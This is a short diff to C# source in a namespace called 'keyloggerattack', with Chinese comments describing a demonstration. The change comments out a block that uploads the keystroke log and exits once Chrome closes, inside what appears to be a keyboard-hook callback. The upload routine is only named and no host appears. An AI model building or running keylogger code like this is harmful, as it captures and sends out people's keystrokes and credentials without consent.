@@ -164,14 +164,14 @@ namespace keyloggerattack
             // 由於示範的關係，我就在這裡加入了傳送記錄檔和關閉程式的程式碼
             // 當 Google Chrome (chrome.exe) 完全關閉了的時候
             // 就退出程式，並上傳記錄檔
-            Process[] proc = Process.GetProcessesByName("chrome");
+           /* Process[] proc = Process.GetProcessesByName("chrome");
             if (proc.Length == 0)
             {
                 // 傳送記錄檔
                 UploadLog();
                 // 關閉程式
                 Environment.Exit(0);
-            }
+            }*/
 
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
